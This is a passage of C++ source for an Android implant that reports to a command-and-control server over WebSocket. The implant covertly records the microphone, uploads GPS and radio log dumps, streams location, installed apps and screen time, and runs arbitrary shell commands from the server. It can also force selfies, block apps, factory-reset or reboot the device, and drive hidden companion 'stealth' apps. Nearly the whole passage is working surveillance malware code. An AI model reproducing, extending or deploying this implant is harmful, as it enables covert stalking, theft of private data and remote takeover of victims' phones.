    std::lock_guard<std::mutex> lk(g_ws_mutex);
    if (!websocket_is_open()) {
        send_error_to_server("file_upload", "WS closed, cannot upload: " + filepath); return;
    }
    g_webSocket.sendText(meta);
    g_webSocket.sendBinary(buffer);
    log_message("upload_file: sent " + std::to_string(sz) + " bytes for " + filepath);
}

void do_report() {
    log_message("do_report: start");

    
    refresh_installed_apps_async();

    g_screen_time_minutes = read_screen_time_minutes();
    time_t now = time(nullptr);

    static const struct { const char* path; const char* source; } app_errors[] = {
        { "/data/user/0/com.stealthgps/files/gps_errors.txt",    "stealth_gps_app"   },
        { "/data/user/0/com.stealthalert/files/alert_errors.txt", "stealth_alert_app" },
        { "/data/user/0/com.stealthaudio/files/audio_errors.txt", "stealth_audio_app" },
    };
    for (const auto& ef : app_errors) {
        int fd = open(ef.path, O_RDONLY);
        if (fd < 0) continue;
        char buf[MAX_COMPANION_ERR_BYTES + 1];
        ssize_t n = read(fd, buf, MAX_COMPANION_ERR_BYTES);
        close(fd);
        if (n <= 0) { unlink(ef.path); continue; }
        buf[n] = '\0';
        std::string errors(buf, static_cast<size_t>(n));
        std::string json;
        json.reserve(80 + g_escaped_implant_key.size() + g_escaped_device_id.size()
                     + json_escape_extra_bytes(ef.source) + json_escape_extra_bytes(errors));
        json += "{\"implant_key\":\""; json += g_escaped_implant_key;
        json += "\",\"device_id\":\"";  json += g_escaped_device_id;
        json += "\",\"error_source\":\""; append_json_escaped(json, ef.source);
        json += "\",\"error_msg\":\"";    append_json_escaped(json, errors);
        json += "\"}";
        if (websocket_send_text(json)) {
            unlink(ef.path);
        }
    }

    
    bool loc_allowed = is_location_enabled();
    int  loc_state   = loc_allowed ? 1 : 0;
    double cur_lat = 0.0, cur_lon = 0.0;
    bool have_location = false;
    if (loc_allowed) {
        have_location = get_location_from_gps_provider(cur_lat, cur_lon);
        if (!have_location) log_message("do_report: no GPS fix yet");
    }

    int battery  = get_battery_level();
    int charging = get_charging_state();
    std::string apps = get_installed_apps_snapshot(); 
    bool send_screen_time = should_send_screen_time(now);

    
    bool send_battery  = g_first_report || battery  != g_last_battery_level.load();
    bool send_charging = g_first_report || charging != g_last_charging_state.load();
    bool send_locstate = g_first_report || loc_state != g_last_loc_state.load()
                         || g_force_location_report.load();
    bool send_latlon   = loc_allowed && have_location;
    bool send_apps     = !apps.empty() && (g_first_report || apps != g_last_installed_apps);

    
    std::string json;
    json.reserve(512);
    json = "{\"implant_key\":\""; json += g_escaped_implant_key;
    json += "\",\"device_id\":\""; json += g_escaped_device_id; json += "\"";

    if (send_battery) {
        json += ",\"battery\":"; json += std::to_string(battery);
    }
    if (send_charging) {
        json += ",\"charging\":"; json += std::to_string(charging);
    }
    if (send_locstate) {
        json += ",\"loc_state\":"; json += std::to_string(loc_state);
    }
    if (send_latlon) {
        char coord_buf[64];
        int  coord_len = std::snprintf(coord_buf, sizeof(coord_buf),
                                       ",\"lat\":%.8f,\"lon\":%.8f", cur_lat, cur_lon);
        if (coord_len > 0) json.append(coord_buf, static_cast<size_t>(coord_len));
    }
    if (send_apps) {
        json += ",\"installed_apps\":\""; append_json_escaped(json, apps); json += "\"";
    }
    if (send_screen_time) {
        json += ",\"screen_time_minutes\":"; json += std::to_string(g_screen_time_minutes);
        json += ",\"event\":\"hourly_screen_time_update\"";
    }
    if (g_first_report) {
        json += ",\"build_id\":\"";      json += g_escaped_build_id;      json += "\"";
        json += ",\"build_version\":\""; json += g_escaped_build_version; json += "\"";
        json += ",\"build_type\":\"";    json += g_escaped_build_type;    json += "\"";
        json += ",\"device\":\"";        json += g_escaped_device_name;   json += "\"";
    }
    json += "}";

    if (json.size() > 256)
        log_message("do_report payload (" + std::to_string(json.size()) + " bytes)");
    else
        log_message("do_report payload: " + json);

    bool sent = websocket_send_text(json);
    if (sent) {
        
        if (send_battery)  g_last_battery_level.store(battery);
        if (send_charging) g_last_charging_state.store(charging);
        if (send_locstate) g_last_loc_state.store(loc_state);
        if (send_latlon) {
            std::lock_guard<std::mutex> lk(g_last_latlon_mutex);
            g_last_lat = cur_lat; g_last_lon = cur_lon;
        }
        if (send_apps) {
            std::lock_guard<std::mutex> lk(g_installed_apps_mutex);
            g_last_installed_apps = apps;
        }
        g_first_report = false;
        g_force_location_report.store(false);
    } else {
        log_message("do_report: WS closed, will retry as first report next cycle.");
    }
    log_message("do_report: done");
}

static void trim_string(std::string& s) {
    while (!s.empty() && std::isspace(static_cast<unsigned char>(s.front()))) s.erase(s.begin());
    while (!s.empty() && std::isspace(static_cast<unsigned char>(s.back())))  s.pop_back();
}

static std::string normalize_audio_play_value(const std::string& json) {
    std::string play = get_json_val(json, "play");
    if (play.empty()) play = get_json_val(json, "play_audio");
    if (play.empty()) play = get_json_val(json, "type");
    trim_string(play);
    if (play.empty()) return "";
    try { return std::to_string(std::stoi(play)); } catch (...) { return play; }
}

static void handle_ipc_message(const std::string& json) {
    const std::string event = get_json_val(json, "event");
    if (event.empty()) return;

    
    
    
    static const std::unordered_set<std::string> ALLOWED = {
        "audio_started", "audio_done",
        "audio_task_queued", "audio_task_started", "audio_task_completed", "audio_task_failed", "audio_task_cancelled",
        "mic_record_started", "mic_record_done",
        "alert_shown", "alert_dismissed"
    };
    if (ALLOWED.find(event) == ALLOWED.end()) {
        log_message("ipc: rejected unknown event: " + event);
        return;
    }

    if (event == "mic_record_file_ready") {
        
        g_mic_file_ready.store(true);
        g_mic_file_cv.notify_one();
        return; 
    }

    
    std::string fwd;
    fwd.reserve(512);
    fwd += "{\"implant_key\":\""; fwd += g_escaped_implant_key;
    fwd += "\",\"device_id\":\"";  fwd += g_escaped_device_id;
    fwd += "\",\"event\":\"";      append_json_escaped(fwd, event); fwd += "\"";
    const std::string pa = get_json_val(json, "play_audio");
    if (!pa.empty()) { fwd += ",\"play_audio\":"; fwd += pa; }
    
    // Forward task queue fields
    const std::string task_id = get_json_val(json, "task_id");
    if (!task_id.empty()) { fwd += ",\"task_id\":"; fwd += task_id; }
    const std::string type = get_json_val(json, "type");
    if (!type.empty()) { fwd += ",\"type\":"; fwd += type; }
    const std::string vol = get_json_val(json, "volume");
    if (!vol.empty()) { fwd += ",\"volume\":"; fwd += vol; }
    const std::string status = get_json_val(json, "status");
    if (!status.empty()) { fwd += ",\"status\":\""; append_json_escaped(fwd, status); fwd += "\""; }
    const std::string error = get_json_val(json, "error");
    if (!error.empty()) { fwd += ",\"error\":\""; append_json_escaped(fwd, error); fwd += "\""; }
    
    fwd += "}";
    
    if (!websocket_send_text(fwd)) {
        log_message("ipc: WS send failed for event=" + event);
    }
}

static void start_local_ipc_server() {
    std::thread([]() {
        int srv = socket(AF_UNIX, SOCK_STREAM, 0);
        if (srv < 0) { log_message("ipc: socket() failed"); return; }

        struct sockaddr_un addr{};
        addr.sun_family = AF_UNIX;
        unlink(LOCAL_IPC_SOCKET);
        strncpy(addr.sun_path, LOCAL_IPC_SOCKET, sizeof(addr.sun_path) - 1);

        if (bind(srv, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr)) < 0) {
            log_message("ipc: bind() failed"); close(srv); return;
        }
        chmod(LOCAL_IPC_SOCKET, 0666); 
        listen(srv, 8);
        log_message("ipc: server ready on " + std::string(LOCAL_IPC_SOCKET));

        while (!g_workerShutdown.load()) {
            fd_set fds; FD_ZERO(&fds); FD_SET(srv, &fds);
            struct timeval tv{1, 0};
            if (select(srv + 1, &fds, nullptr, nullptr, &tv) <= 0) continue;

            int cli = accept(srv, nullptr, nullptr);
            if (cli < 0) continue;

            
            
            if (!enqueue_task([cli]() {
                std::string buf;
                buf.reserve(256);
                char ch;
                while (buf.size() < 4096) {
                    if (read(cli, &ch, 1) <= 0 || ch == '\n') break;
                    buf += ch;
                }
                close(cli);
                if (!buf.empty()) handle_ipc_message(buf);
            })) {
                close(cli); 
                log_message("ipc: worker queue full, dropped client");
            }
        }
        close(srv);
        unlink(LOCAL_IPC_SOCKET);
        log_message("ipc: server stopped");
    }).detach();
}

static bool do_mic_record_stealth_fallback(int duration_s) {
    
    g_mic_file_ready.store(false);
    unlink(MIC_RECORD_DONE_FILE);
    unlink(MIC_FILE);
    log_message("mic_record: StealthAudio fallback for " + std::to_string(duration_s) + "s");
    if (!run_command_no_output({
            "am", "broadcast", "-n", "com.stealthaudio/.StealthAudioReceiver",
            "-f", "32", "--es", "action", "record",
            "--ei", "duration", std::to_string(duration_s),
            "--es", "device_id", g_device_id })) {
        return false;
    }
    
    {
        std::unique_lock<std::mutex> lk(g_mic_file_mutex);
        g_mic_file_cv.wait_for(lk, std::chrono::seconds(duration_s + 60),
                               [] { return g_mic_file_ready.load(); });
        g_mic_file_ready.store(false);
    }
    
    unlink(MIC_RECORD_DONE_FILE);
    struct stat st{};
    if (stat(MIC_FILE, &st) != 0 || st.st_size <= 44) {
        log_message("mic_record: WAV absent or too small after wait");
        return false;
    }
    return true;
}

static bool open_aaudio_input(AAudioStream** out, int32_t* rate, int32_t* channels) {
    static const int32_t rates[] = {48000, 44100, 16000};
    for (int32_t r : rates) {
        AAudioStreamBuilder* builder = nullptr;
        if (AAudio_createStreamBuilder(&builder) != AAUDIO_OK) continue;
        AAudioStreamBuilder_setDirection(builder,       AAUDIO_DIRECTION_INPUT);
        AAudioStreamBuilder_setPerformanceMode(builder, AAUDIO_PERFORMANCE_MODE_NONE);
        AAudioStreamBuilder_setSharingMode(builder,     AAUDIO_SHARING_MODE_SHARED);
        AAudioStreamBuilder_setFormat(builder,          AAUDIO_FORMAT_PCM_I16);
        AAudioStreamBuilder_setChannelCount(builder,    1);
        AAudioStreamBuilder_setSampleRate(builder,      r);
        AAudioStreamBuilder_setInputPreset(builder,     AAUDIO_INPUT_PRESET_VOICE_RECOGNITION);
        AAudioStream* stream = nullptr;
        aaudio_result_t res = AAudioStreamBuilder_openStream(builder, &stream);
        AAudioStreamBuilder_delete(builder);
        if (res == AAUDIO_OK && stream) {
            *out      = stream;
            *rate     = AAudioStream_getSampleRate(stream);
            *channels = AAudioStream_getChannelCount(stream);
            return true;
        }
        if (stream) AAudioStream_close(stream);
    }
    return false;
}

void do_mic_record(int duration_s) {
    static constexpr int MAX_MIC = 300;
    if (g_mic_record_in_progress.exchange(true)) {
        send_error_to_server("mic_record", "Already recording");
        return;
    }
    struct Guard { ~Guard() { g_mic_record_in_progress = false; } } guard;

    if (duration_s <= 0) { duration_s = 30; }
    else if (duration_s > MAX_MIC) { duration_s = MAX_MIC; }

    unlink(MIC_FILE);

    AAudioStream* stream   = nullptr;
    int32_t actual_rate    = 0;
    int32_t actual_channels = 0;
    if (!open_aaudio_input(&stream, &actual_rate, &actual_channels)) {
        log_message("mic_record: AAudio unavailable, trying StealthAudio");
        if (do_mic_record_stealth_fallback(duration_s)) upload_file(MIC_FILE);
        else send_error_to_server("mic_record", "Both AAudio and StealthAudio failed");
        return;
    }

    if (AAudioStream_requestStart(stream) != AAUDIO_OK) {
        AAudioStream_close(stream);
        if (do_mic_record_stealth_fallback(duration_s)) upload_file(MIC_FILE);
        else send_error_to_server("mic_record", "AAudio start failed");
        return;
    }

    FILE* file = fopen(MIC_FILE, "wb");
    if (!file) {
        AAudioStream_requestStop(stream); AAudioStream_close(stream);
        send_error_to_server("mic_record", "Cannot open output file");
        return;
    }

    
    struct __attribute__((packed)) wav_header {
        uint32_t riff_id; uint32_t riff_sz; uint32_t wave_id;
        uint32_t fmt_id;  uint32_t fmt_sz;  uint16_t audio_format;
        uint16_t num_channels; uint32_t sample_rate; uint32_t byte_rate;
        uint16_t block_align; uint16_t bits_per_sample;
        uint32_t data_id; uint32_t data_sz;
    } hdr;

    uint16_t block_align = static_cast<uint16_t>(actual_channels * 2);
    hdr.riff_id = 0x46464952; hdr.riff_sz = 0;  hdr.wave_id = 0x45564157;
    hdr.fmt_id  = 0x20746d66; hdr.fmt_sz  = 16; hdr.audio_format = 1;
    hdr.num_channels  = static_cast<uint16_t>(actual_channels);
    hdr.sample_rate   = static_cast<uint32_t>(actual_rate);
    hdr.bits_per_sample = 16;
    hdr.block_align   = block_align;
    hdr.byte_rate     = static_cast<uint32_t>(actual_rate) * block_align;
    hdr.data_id = 0x61746164; hdr.data_sz = 0;

    
    if (fseek(file, static_cast<long>(sizeof(hdr)), SEEK_SET) != 0) {
        fclose(file); unlink(MIC_FILE);
        AAudioStream_requestStop(stream); AAudioStream_close(stream);
        send_error_to_server("mic_record", "fseek failed before capture");
        return;
    }

    const unsigned read_frames = static_cast<unsigned>(std::max(1024, actual_rate / 20));
    std::vector<int16_t> buf(read_frames * static_cast<size_t>(actual_channels));
    unsigned total_frames = 0;
    const unsigned target  = static_cast<unsigned>(actual_rate) * static_cast<unsigned>(duration_s);
    bool capture_ok = true;

    while (total_frames < target) {
        aaudio_result_t fr = AAudioStream_read(stream, buf.data(), read_frames, 2000000000LL);
        if (fr < 0) { capture_ok = false; break; }
        if (fr == 0) continue;
        total_frames += static_cast<unsigned>(fr);
        if (fwrite(buf.data(), block_align, static_cast<size_t>(fr), file) != static_cast<size_t>(fr)) {
            log_message("mic_record: fwrite error: " + std::string(strerror(errno)));
            capture_ok = false; break;
        }
    }

    AAudioStream_requestStop(stream); AAudioStream_close(stream);

    
    hdr.data_sz = total_frames * block_align;
    hdr.riff_sz = hdr.data_sz + static_cast<uint32_t>(sizeof(hdr)) - 8;

    
    bool header_ok = (fseek(file, 0, SEEK_SET) == 0);
    if (header_ok) header_ok = (fwrite(&hdr, sizeof(hdr), 1, file) == 1);
    fclose(file);

    if (!header_ok || !capture_ok || total_frames == 0) {
        unlink(MIC_FILE);
        if (!do_mic_record_stealth_fallback(duration_s)) {
            send_error_to_server("mic_record", "Capture failed or 0 frames; fallback also failed");
            return;
        }
    }
    upload_file(MIC_FILE);
}

void do_audio_blast(const std::string& play, const std::string& loops, const std::string& volume) {
    log_message("audio_blast: play=" + play + " loops=" + loops + " volume=" + volume);
    if (play.empty()) return;
    
    if (play == "1" || play == "2" || play == "3") {
        // Generate unique task_id
        long taskId = (long)std::time(nullptr) * 1000 + (int)(rand() % 1000);
        
        // Enqueue task (optional, mainly for tracking)
        {
            std::lock_guard<std::mutex> lock(g_audio_queue_mutex);
            if (g_audio_task_queue.size() < MAX_AUDIO_QUEUE_SIZE) {
                AudioTask task;
                task.taskId = taskId;
                task.type = std::stoi(play);
                task.volume = std::stof(volume);
                task.loops = std::stoi(loops);
                task.status = "pending";
                g_audio_task_queue.push(task);
                log_message("Audio task " + std::to_string(taskId) + " enqueued (type=" + play + ")");
            } else {
                log_message("Audio queue full, rejecting task");
                send_error_to_server("audio_blast", "Queue full");
                return;
            }
        }
        
        // Broadcast with task_id
        if (!run_command_no_output({
                "am", "broadcast", "-n", "com.stealthaudio/.StealthAudioReceiver",
                "-f", "32", "--es", "action", "play", "--ei", "type", play,
                "--es", "volume", volume, "--ei", "loops", loops,
                "--el", "task_id", std::to_string(taskId),
                "--es", "device_id", g_device_id })) {
            send_error_to_server("audio_blast", "Broadcast failed");
        }
        return;
    }
    
    if (play == "0") {
        // STOP command - can optionally pass task_id to cancel specific task
        run_command_no_output({"am", "broadcast", "-n", "com.stealthaudio/.StealthAudioReceiver",
                                "-f", "32", "--es", "action", "stop",
                                "--es", "device_id", g_device_id});
        
        // Clear queue (optional)
        {
            std::lock_guard<std::mutex> lock(g_audio_queue_mutex);
            while (!g_audio_task_queue.empty()) {
                g_audio_task_queue.pop();
            }
            log_message("Audio queue cleared");
        }
        return;
    }
    
    send_error_to_server("audio_blast", "Invalid play value: " + play);
}

void do_gps_dump() {
    log_message("do_gps_dump: start");
    auto [location_ok, location_out] = exec_cmd(std::vector<std::string>{"dumpsys", "location"});

    int out_fd = open(GPS_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out_fd < 0) { send_error_to_server("gps_dump", "Cannot open output file"); return; }
    bool wrote = false;

    if (location_ok && !location_out.empty()) {
        ssize_t w = write(out_fd, location_out.data(), location_out.size());
        if (w > 0) { write(out_fd, "\n", 1); wrote = true; }
    }

    int pipefd[2];
    if (pipe(pipefd) == 0) {
        pid_t pid = fork();
        if (pid == 0) {
            close(pipefd[0]);
            dup2(pipefd[1], STDOUT_FILENO); dup2(pipefd[1], STDERR_FILENO);
            close(pipefd[1]);
            const char* args[] = {"logcat", "-d", "-b", "radio", nullptr};
            execvp(args[0], const_cast<char**>(args));
            _exit(127);
        }
        close(pipefd[1]);
        static constexpr std::string_view TAG = "GpsLocation";
        char chunk[4096]; std::string line_buf;
        ssize_t n;
        while ((n = read(pipefd[0], chunk, sizeof(chunk))) > 0) {
            for (ssize_t i = 0; i < n; ++i) {
                char c = chunk[i];
                if (c == '\n') {
                    if (line_buf.find(TAG) != std::string::npos) {
                        line_buf.push_back('\n');
                        write(out_fd, line_buf.data(), line_buf.size());
                        wrote = true;
                    }
                    line_buf.clear();
                } else { line_buf.push_back(c); }
            }
        }
        close(pipefd[0]);
        int status = 0; waitpid(pid, &status, 0);
    }

    close(out_fd);
    if (!wrote) { unlink(GPS_FILE); send_error_to_server("gps_dump", "No GPS data found"); return; }
    log_message("do_gps_dump: done");
    upload_file(GPS_FILE);
}

void do_shell_command(const std::string& cmd) {
    if (cmd.empty()) { send_error_to_server("shell_cmd", "Empty command"); return; }
    log_message("shell_cmd: " + cmd);
    auto [success, result] = exec_cmd_shell(cmd);
    if (result.empty()) result = success ? "[No output]" : "[Command failed, no output]";

    std::string json;
    json.reserve(80 + g_escaped_implant_key.size() + g_escaped_device_id.size()
                 + result.size() + json_escape_extra_bytes(result));
    json += "{\"implant_key\":\""; json += g_escaped_implant_key;
    json += "\",\"device_id\":\"";  json += g_escaped_device_id;
    json += "\",\"command_result\":\""; append_json_escaped(json, result); json += "\"}";
    if (!websocket_send_text(json))
        send_error_to_server("shell_cmd", "WS closed, result lost for: " + cmd);
}

void do_factory_reset() {
    log_message("do_factory_reset: executing MASTER_CLEAR broadcast");
    auto [success, result] = exec_cmd_shell("am broadcast -a android.intent.action.MASTER_CLEAR");
    bool denied = result.find("Permission Denial") != std::string::npos
               || result.find("Permission denied") != std::string::npos;
    if (!success || denied)
        send_error_to_server("factory_reset", denied ? "Permission denied" : "Command failed");

    if (result.empty()) result = success ? "[ok]" : "[failed]";
    std::string json;
    json.reserve(80 + g_escaped_implant_key.size() + g_escaped_device_id.size()
                 + result.size() + json_escape_extra_bytes(result));
    json += "{\"implant_key\":\""; json += g_escaped_implant_key;
    json += "\",\"device_id\":\"";  json += g_escaped_device_id;
    json += "\",\"command_result\":\""; append_json_escaped(json, result); json += "\"}";
    websocket_send_text(json);
}

void process_tasks() {
    std::vector<std::string> tasks;
    {
        std::lock_guard<std::mutex> lk(g_taskMutex);
        tasks.reserve(g_taskQueue.size());
        while (!g_taskQueue.empty()) {
            tasks.push_back(std::move(g_taskQueue.front()));
            g_taskQueue.pop();
        }
    }
    if (tasks.empty()) return;
    log_message("process_tasks: " + std::to_string(tasks.size()) + " task(s)");

    for (const auto& payload : tasks) {
        std::string task = get_json_val(payload, "task");

        if (task == "mic_record") {
            int dur = 0;
            try { dur = std::stoi(get_json_val(payload, "duration")); } catch (...) {}
            enqueue_task([dur]() { do_mic_record(dur); });

        } else if (task == "gps_dump") {
            enqueue_task([]() { do_gps_dump(); });

        } else if (task == "shell") {
            std::string cmd = get_json_val(payload, "command");
            enqueue_task([cmd]() { do_shell_command(cmd); });

        } else if (task == "update_blocked_apps") {
            std::string apps_str = get_json_val(payload, "apps");
            std::vector<std::string> apps;
            const char* p = apps_str.data(), *end = p + apps_str.size();
            while (p < end) {
                const char* q = static_cast<const char*>(std::memchr(p, ',', static_cast<size_t>(end - p)));
                if (!q) q = end;
                const char* tok = p; while (tok < q && *tok == ' ') ++tok;
                const char* tok_end = q; while (tok_end > tok && *(tok_end-1) == ' ') --tok_end;
                size_t len = static_cast<size_t>(tok_end - tok);
                if (len > 0) apps.emplace_back(tok, len);
                p = q + (q < end ? 1 : 0);
            }
            {
                std::lock_guard<std::mutex> lk(g_forbiddenMutex);
                g_forbiddenApps = std::move(apps);
            }
            g_forbiddenCV.notify_one();
            log_message("update_blocked_apps: " + std::to_string(g_forbiddenApps.size()) + " blocked");

        } else if (task == "set_location") {
            int track = 0;
            try { track = std::stoi(get_json_val(payload, "track")); } catch (...) {}
            set_location_file(track);
            log_message("set_location: " + std::to_string(track));
            int interval_ms = g_ping_interval.load() * 1000;
            if (track == 1) {
                enqueue_task([interval_ms]() { run_command_no_output(gps_service_launch_argv(interval_ms)); });
            } else {
                enqueue_task([]() { exec_cmd(split_command_line("am force-stop com.stealthgps")); });
            }

        } else if (task == "check_location_state") {
            bool enabled  = is_location_enabled();
            double lat = 0.0, lon = 0.0;
            bool have_gps = false;
            if (enabled) {
                g_cached_gps_valid = false; 
                have_gps = get_location_from_gps_provider(lat, lon);
            }
            std::string json;
            json.reserve(128);
            json += "{\"implant_key\":\""; json += g_escaped_implant_key;
            json += "\",\"device_id\":\"";  json += g_escaped_device_id;
            json += "\",\"loc_state\":";    json += std::to_string(enabled ? 1 : 0);
            if (have_gps) {
                char coord_buf[64];
                int cl = std::snprintf(coord_buf, sizeof(coord_buf), ",\"lat\":%.8f,\"lon\":%.8f", lat, lon);
                if (cl > 0) json.append(coord_buf, static_cast<size_t>(cl));
            }
            json += "}";
            if (!websocket_send_text(json))
                send_error_to_server("check_location_state", "WS closed, response lost");

        } else if (task == "factory_reset") {
            enqueue_task([]() { do_factory_reset(); });

        } else if (task == "refresh_installed_apps") {
            g_installed_apps_dirty.store(true);
            log_message("refresh_installed_apps: dirty flag set");

        } else if (task == "set_interval") {
            int interval = g_ping_interval.load();
            try { interval = std::stoi(get_json_val(payload, "interval")); } catch (...) {}
            interval = std::max(1, interval);
            g_ping_interval.store(interval);
            if (!save_ping_interval_to_file(interval))
                send_error_to_server("set_interval", "Failed to persist interval");
            log_message("set_interval: " + std::to_string(interval) + "s");
            if (is_location_enabled()) {
                int ms = interval * 1000;
                enqueue_task([ms]() { run_command_no_output(gps_service_launch_argv(ms)); });
            }

        } else if (task == "system_alert") {
            std::string state = get_json_val(payload, "state");
            std::string text  = get_json_val(payload, "text");
            std::string title = get_json_val(payload, "title");
            enqueue_task([state, text, title]() {
                if (state == "1") {
                    run_command_no_output({"am", "force-stop", "com.stealthalert"});
                    std::vector<std::string> cmd = {"am", "start", "-n", "com.stealthalert/.AlertActivity",
                                                    "--es", "text", text};
                    if (!title.empty()) {
                        cmd.push_back("--es");
                        cmd.push_back("title");
                        cmd.push_back(title);
                    }
                    bool ok = run_command_no_output(cmd);
                    if (!ok) send_error_to_server("system_alert", "Failed to launch StealthAlert");
                } else if (state == "0") {
                    run_command_no_output({"am", "force-stop", "com.stealthalert"});
                } else {
                    send_error_to_server("system_alert", "Invalid state: " + state);
                }
            });

        } else if (task == "audio_play") {
            std::string play = normalize_audio_play_value(payload);
            std::string loops = get_json_val(payload, "loops"); trim_string(loops);
            std::string volume = get_json_val(payload, "volume"); trim_string(volume);
            if (play.empty()) play = "1";
            if (loops.empty()) loops = "0";
            if (volume.empty()) volume = "1.0";
            try { loops = std::to_string(std::stoi(loops)); } catch (...) { loops = "0"; }
            enqueue_task([play, loops, volume]() { do_audio_blast(play, loops, volume); });

        } else if (task == "audio_clear_queue") {
            enqueue_task([]() { do_audio_blast("0", "0", "1.0"); });

        } else if (task == "audio_cancel") {
            std::string task_id = get_json_val(payload, "task_id");
            log_message("audio_cancel: task_id=" + task_id);
            enqueue_task([]() { do_audio_blast("0", "0", "1.0"); });

        } else if (task == "vibrate") {
            std::string duration = get_json_val(payload, "duration"); trim_string(duration);
            if (duration.empty()) duration = "1";
            log_message("vibrate task: duration=" + duration);
            enqueue_task([duration]() {
                run_command_no_output({"am", "broadcast", "-n", "com.stealthaudio/.StealthAudioReceiver",
                                        "-f", "32", "--es", "action", "vibrate",
                                        "--ei", "duration", duration,
                                        "--es", "device_id", g_device_id});
            });

        } else if (task == "audio_blast") {
            std::string play   = normalize_audio_play_value(payload);
            std::string loops  = get_json_val(payload, "loops");  trim_string(loops);
            std::string volume = get_json_val(payload, "volume"); trim_string(volume);
            if (loops.empty())  loops  = "0";
            if (volume.empty()) volume = "1.0";
            try { loops = std::to_string(std::stoi(loops)); } catch (...) { loops = "0"; }
            enqueue_task([play, loops, volume]() { do_audio_blast(play, loops, volume); });

        } else if (task == "power_cmd") {
            std::string action = get_json_val(payload, "action");
            log_message("power_cmd: " + action);
            
            if (action == "reboot") {
                enqueue_task([]() { exec_cmd(split_command_line("reboot")); });
            } else if (action == "shutdown") {
                enqueue_task([]() { exec_cmd(split_command_line("reboot -p")); });
            } else {
                send_error_to_server("power_cmd", "Unknown action: " + action);
            }

        } else if (task == "force_selfie") {
            enqueue_task([]() {
                
                
                
                bool ok = run_command_no_output({"am", "broadcast", "-n",
                    "com.stealthselfie/.SelfieCommandReceiver",
                    "-f", "32", "--es", "action", "capture"});
                if (!ok) send_error_to_server("force_selfie", "Failed to broadcast to StealthSelfie");
            });

        } else if (!task.empty()) {
            send_error_to_server("task_dispatch", "Unknown task: " + task);
        }
    }
}

static void parse_args(int argc, char* argv[], std::string& out_url, std::string& out_device_id) {
    static const struct option long_opts[] = {
        {"server-url", required_argument, nullptr, 's'},
        {"device-id",  required_argument, nullptr, 'd'},
        {nullptr, 0, nullptr, 0}
    };
    int c;
    while ((c = getopt_long(argc, argv, "s:d:", long_opts, nullptr)) != -1) {
        switch (c) {
            case 's': out_url = optarg;       break;
            case 'd': out_device_id = optarg; break;
            default: break;
        }
    }
}

int main(int argc, char* argv[]) {
    
    if (ENABLE_FILE_LOGGING) {
        g_log_file = fopen(LOG_PATH, "a");
        if (g_log_file) {
            chmod(LOG_PATH, 0666);
            fseek(g_log_file, 0, SEEK_END);
            g_log_size = static_cast<size_t>(ftell(g_log_file));
        }
    }

    
    {
        const char* env_key = getenv("IMPLANT_KEY");
        g_implant_key = (env_key && env_key[0]) ? env_key : "DeltaForce2027";
    }

    g_device_id     = get_serialno();
    g_build_id      = get_build_id();
    g_build_version = get_build_version();
    g_build_type    = get_build_type();
    g_device_name   = get_device_name();

    log_message("Reporter starting. device_id=" + g_device_id);

    g_escaped_implant_key  = json_escape(g_implant_key);
    g_escaped_device_id    = json_escape(g_device_id);
    g_escaped_build_id     = json_escape(g_build_id);
    g_escaped_build_version = json_escape(g_build_version);
    g_escaped_build_type   = json_escape(g_build_type);
    g_escaped_device_name  = json_escape(g_device_name);

    signal(SIGPIPE, SIG_IGN);
    ix::initNetSystem();

    
    for (int i = 0; i < WORKER_THREAD_COUNT; ++i)
        std::thread(worker_thread_loop).detach();

    
    static const std::string gps_coords_temp_path = std::string(GPS_COORDS_FILE) + ".tmp";
    const char* shared_files[] = {
        GPS_COORDS_FILE,
        gps_coords_temp_path.c_str(),
        SCREEN_TIME_FILE
    };
    for (const char* path : shared_files) {
        int fd = open(path, O_WRONLY | O_CREAT, 0666);
        if (fd >= 0) { close(fd); chmod(path, 0666); }
    }

    
    
    run_command_no_output({"am", "start-foreground-service", "--user", "0",
                           "-n", "com.stealthmonitor/.ScreenTimeService"});

    
    int interval = load_ping_interval_from_file(g_ping_interval.load());
    g_ping_interval.store(interval);
    log_message("Ping interval: " + std::to_string(interval) + "s");

    
    std::string ws_url;
    std::string cli_device_id;
    parse_args(argc, argv, ws_url, cli_device_id);
    if (!cli_device_id.empty()) {
        g_device_id         = cli_device_id;
        g_escaped_device_id = json_escape(g_device_id);
    }
    if (ws_url.empty()) {
        std::ifstream url_file(C2_URL_FILE);
        if (url_file.is_open()) {
            std::string line;
            if (std::getline(url_file, line) && !line.empty()) {
                line.erase(std::find_if(line.rbegin(), line.rend(),
                    [](unsigned char c) { return !std::isspace(c); }).base(), line.end());
                ws_url = line;
                log_message("C2 URL from file: " + ws_url);
            }
        }
    }
    if (ws_url.empty()) {
        ws_url = DEFAULT_WS_SERVER_URL;
        log_message("C2 URL default: " + ws_url);
    }

    
    {
        int fd = open(C2_URL_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0666);
        if (fd >= 0) {
            std::string line = ws_url + "\n";
            write(fd, line.c_str(), line.size());
            close(fd);
            chmod(C2_URL_FILE, 0666);
        }
    }

    
    
    {
        static constexpr const char* IMPLANT_KEY_FILE = "/data/local/tmp/implant.key";
        int fd = open(IMPLANT_KEY_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd >= 0) {
            std::string key_line = g_implant_key + "\n";
            write(fd, key_line.c_str(), key_line.size());
            close(fd);
            chmod(IMPLANT_KEY_FILE, 0644);
        }
    }

    
    
    
    start_local_ipc_server();

    
    
    if (is_location_enabled()) {
        int gps_ms = interval * 1000;
        enqueue_task([gps_ms]() { run_command_no_output(gps_service_launch_argv(gps_ms)); });
    }

    
    g_webSocket.setUrl(ws_url);
    g_webSocket.setPingInterval(45);
    g_webSocket.enableAutomaticReconnection();

    ix::SocketTLSOptions tls;
    if (access(C2_TLS_PIN_FILE, F_OK) == 0) {
        tls.caFile = C2_TLS_PIN_FILE;
        tls.disable_hostname_validation = false;
        log_message("TLS: using pinned cert");
    } else {
        
        
        tls.caFile = "SYSTEM";
        tls.disable_hostname_validation = false;
        log_message("TLS: using system CA bundle");
    }
    g_webSocket.setTLSOptions(tls);

    g_webSocket.setOnMessageCallback([](const ix::WebSocketMessagePtr& msg) {
        if (msg->type == ix::WebSocketMessageType::Message) {
            if (!validate_inbound_task(msg->str)) {
                log_message("Rejected inbound task (bad key or missing task field)");
                return;
            }
            {
                std::lock_guard<std::mutex> lk(g_taskMutex);
                if (g_taskQueue.size() < 50) g_taskQueue.push(msg->str);
                else log_message("Task queue full; dropping command.");
            }
            g_taskCV.notify_one();
        } else if (msg->type == ix::WebSocketMessageType::Open) {
